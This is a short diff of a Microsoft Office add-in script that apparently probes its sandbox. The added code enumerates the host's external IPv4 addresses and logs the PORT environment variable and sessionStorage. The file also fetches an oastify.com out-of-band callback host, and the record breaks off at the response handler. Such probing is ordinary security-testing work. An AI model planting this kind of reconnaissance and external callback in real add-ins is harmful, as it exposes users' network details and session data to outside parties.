@@ -5,10 +5,20 @@
 
 Office.initialize = function (reason) {};
 
-console.log("In combined2.js");
+console.log("In combined3.js");
 
-const os = require('node:os'); //require not defined
-const ifaces = os.networkInterfaces(); //os not defined
+const ifaces = os.networkInterfaces();
+for (const iface in ifaces) {
+	const addresses = ifaces[iface];
+	for (const addr of addresses) {
+	  if (addr.family === 'IPv4' && !addr.internal) {
+		console.log(`Address ${addr.address}`);
+	  }
+	}
+}
+
+console.log(process.env.PORT);
+console.log(sessionStorage);
 
 fetch("https://jresxvrpsurc692ohxsbvia85zbqzhq5f.oastify.com")
   .then((res) => {
